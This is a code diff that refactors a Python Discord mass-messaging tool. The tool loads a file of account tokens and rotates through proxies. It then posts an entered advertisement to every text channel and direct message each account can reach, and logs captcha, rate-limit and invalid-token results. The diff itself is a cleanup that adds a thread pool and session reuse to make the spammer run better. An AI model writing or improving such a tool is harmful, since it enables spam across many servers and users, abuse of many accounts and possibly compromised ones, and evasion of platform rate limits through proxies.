@@ -7,29 +7,30 @@ import getpass
 import random
 import os
 import threading
+from concurrent.futures import ThreadPoolExecutor
 
-TOKEN = '' # For single advertising
-DEBUG = False # If the messages somehow does not send, set this to true to see more detailed errors and more informations
-DETAILED = True # Leave it on True if you want to use it as a tool, It will just print in the console success/failed/captcha tokens
+TOKEN = ''  # For single advertising
+DEBUG = False  # If the messages somehow do not send, set this to true to see more detailed errors and more informations
+DETAILED = True  # Leave it on True if you want to use it as a tool, It will just print in the console success/failed/captcha tokens
 
 if TOKEN == '' or None:
-   with open('tokens.txt', 'r') as f:
-    TOKEN = [line.strip() for line in f.readlines()]
+    with open('tokens.txt', 'r') as f:
+        TOKEN = [line.strip() for line in f.readlines()]
 else:
     TOKEN = TOKEN
 
-class logger:
+class Logger:
     def __init__(self, prefix: str = ".gg/bestnitro"):
-        self.WHITE: str = "\u001b[37m"
-        self.MAGENTA: str = "\033[38;5;97m"
-        self.MAGENTAA: str = "\033[38;2;157;38;255m"
-        self.RED: str = "\033[38;5;196m"
-        self.GREEN: str = "\033[38;5;40m"
-        self.YELLOW: str = "\033[38;5;220m"
-        self.BLUE: str = "\033[38;5;21m"
-        self.PINK: str = "\033[38;5;176m"
-        self.CYAN: str = "\033[96m"
-        self.prefix: str = f"{self.PINK}[{self.MAGENTA}{prefix}{self.PINK}] "
+        self.WHITE = "\u001b[37m"
+        self.MAGENTA = "\033[38;5;97m"
+        self.MAGENTAA = "\033[38;2;157;38;255m"
+        self.RED = "\033[38;5;196m"
+        self.GREEN = "\033[38;5;40m"
+        self.YELLOW = "\033[38;5;220m"
+        self.BLUE = "\033[38;5;21m"
+        self.PINK = "\033[38;5;176m"
+        self.CYAN = "\033[96m"
+        self.prefix = f"{self.PINK}[{self.MAGENTA}{prefix}{self.PINK}] "
 
     def message3(self, level: str, message: str, start: int = None, end: int = None) -> str:
         time = self.get_time()
@@ -85,8 +86,9 @@ def home():
     \t\t                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     \t\t  ════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n""", Colors.red_to_blue, interval=0.0000)
 
-log = logger()
+log = Logger()
 home()
+
 # Read proxies from file
 with open('proxies.txt', 'r') as f:
     proxies = [line.strip() for line in f.readlines()]
@@ -96,34 +98,31 @@ message = log.question(f"Enter the message you want to send: ")
 try:
     threads_count = int(log.question(f"Enter the number of threads to use: "))
 except Exception:
-    threads_count = 10 # Base Threads
+    threads_count = 10  # Base Threads
 
 home()
+
 # Send message to all available channels and DMs
 def send_message(token, used_tokens):
+    session = requests.Session()
     headers = {
         'Authorization': token,
         'Content-Type': 'application/json'
     }
 
-    # Choose a random proxy
     proxy = random.choice(proxies)
-    proxies_dict = {
+    session.proxies = {
         'http': "http://" + proxy,
         'https': "http://" + proxy
     }
 
     try:
-        response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, proxies=proxies_dict)
+        response = session.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
         if response.status_code == 401:
             log.failure(f"Invalid token: {truncate_token(token)}")
             with open('invalid.txt', 'a') as f:
                 f.write(token + '\n')
-
-            # Remove the token from the TOKEN list
             TOKEN.remove(token)
-
-            # Save the updated TOKEN list to the tokens.txt file
             with open('tokens.txt', 'w') as f:
                 for token in TOKEN:
                     f.write(token + '\n')
@@ -135,9 +134,8 @@ def send_message(token, used_tokens):
 
         guilds = json.loads(response.text)
 
-        # Send message to all available channels
         for guild in guilds:
-            response = requests.get(f'https://discord.com/api/v9/guilds/{guild["id"]}/channels', headers=headers, proxies=proxies_dict)
+            response = session.get(f'https://discord.com/api/v9/guilds/{guild["id"]}/channels', headers=headers)
             if response.status_code != 200 and DEBUG:
                 log.failure(f"Failed to get channels for guild {guild['name']} - {guild['id']} for token {truncate_token(token)}: {response.status_code} - {response.text}")
                 continue
@@ -149,51 +147,37 @@ def send_message(token, used_tokens):
                 if DEBUG:
                     log.info(f"Got channel {channel['name']} - {channel['id']} in {guild['name']} - {guild['id']}")
                 if channel['type'] == 0:  # Text channel
-                    # Check if token has already been used to send a message to this channel
                     if (channel["id"], guild["id"]) in used_tokens:
                         continue
-                    req1 = requests.post(f'https://discord.com/api/v9/channels/{channel["id"]}/messages', headers=headers, json={'content': message}, proxies=proxies_dict)
+                    req1 = session.post(f'https://discord.com/api/v9/channels/{channel["id"]}/messages', headers=headers, json={'content': message})
                     if req1.status_code == 200 and DETAILED:
                         log.message("Success", f"Successfully sent message to {channel['name']} in {guild['name']} {truncate_token(token)}")
                     elif req1.status_code == 401:
                         log.failure(f"Invalid token: {truncate_token(token)}")
                         with open('invalid.txt', 'a') as f:
                             f.write(token + '\n')
-
-                        # Remove the token from the TOKEN list
                         TOKEN.remove(token)
-
-                        # Save the updated TOKEN list to the tokens.txt file
                         with open('tokens.txt', 'w') as f:
                             for token in TOKEN:
                                 f.write(token + '\n')
                         return
                     elif req1.status_code == 429:
                         log.failure(f"Rate limited for token: {truncate_token(token)} {req1.text}")
-
                     elif req1.status_code == 403 and "captcha" in req1.text and DETAILED:
                         log.failure(f"Captcha required for token: {truncate_token(token)}")
-
                     elif req1.status_code == 403:
                         log.failure(f"Missing access/perms for token: {truncate_token(token)} in channel {channel['name']} in server {guild['name']}")
-
                     elif req1.status_code != 200 and DEBUG:
                         log.failure(f"Failed to send message to channel {channel['name']} - {channel['id']} in guild {guild['name']} - {guild['id']} for token {truncate_token(token)}: {req1.status_code} - {req1.text}")
 
-                    # Mark token as used for this channel
                     used_tokens.add((channel["id"], guild["id"]))
 
-        # Get the user's DMs
-        response = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers, proxies=proxies_dict)
+        response = session.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
         if response.status_code == 401:
             log.failure(f"Invalid token: {truncate_token(token)}")
             with open('invalid.txt', 'a') as f:
                 f.write(token + '\n')
-
-            # Remove the token from the TOKEN list
             TOKEN.remove(token)
-
-            # Save the updated TOKEN list to the tokens.txt file
             with open('tokens.txt', 'w') as f:
                 for token in TOKEN:
                     f.write(token + '\n')
@@ -205,26 +189,18 @@ def send_message(token, used_tokens):
         else:
             dms = json.loads(response.text)
             for dm in dms:
-                # Check if the DM is with a bot
                 if dm['recipients'][0]['bot']:
                     continue
-
-                # Check if token has already been used to send a message to this DM
                 if dm["id"] in used_tokens:
                     continue
-
-                req1 = requests.post(f'https://discord.com/api/v9/channels/{dm["id"]}/messages', headers=headers, json={'content': message}, proxies=proxies_dict)
+                req1 = session.post(f'https://discord.com/api/v9/channels/{dm["id"]}/messages', headers=headers, json={'content': message})
                 if req1.status_code == 200 and DETAILED:
                     log.message("Success", f"Successfully sent message to DM {dm['name']} {truncate_token(token)}")
                 elif req1.status_code == 401:
                     log.failure(f"Invalid token: {truncate_token(token)}")
                     with open('invalid.txt', 'a') as f:
                         f.write(token + '\n')
-
-                    # Remove the token from the TOKEN list
                     TOKEN.remove(token)
-
-                    # Save the updated TOKEN list to the tokens.txt file
                     with open('tokens.txt', 'w') as f:
                         for token in TOKEN:
                             f.write(token + '\n')
@@ -238,27 +214,16 @@ def send_message(token, used_tokens):
                 elif req1.status_code != 200 and DEBUG:
                     log.failure(f"Failed to send message to DM {dm['name']} - {dm['id']} for token {truncate_token(token)}: {req1.status_code} - {req1.text}")
 
-                # Mark token as used for this DM
                 used_tokens.add(dm["id"])
 
     except Exception as e:
         if DEBUG:
             print(e)
-        else:
-            pass
 
 used_tokens = set()
 
-# Send message indefinitely
-threads_pool = []
-for token in TOKEN:
-    for _ in range(threads_count):
-        t = threading.Thread(target=send_message, args=(token, used_tokens))
-        threads_pool.append(t)
+with ThreadPoolExecutor(max_workers=threads_count) as executor:
+    futures = [executor.submit(send_message, token, used_tokens) for token in TOKEN]
 
-for t in threads_pool:
-    t.start()
-
-# Wait for all threads to finish
-for t in threads_pool:
-    t.join()
+for future in futures:
+    future.result()
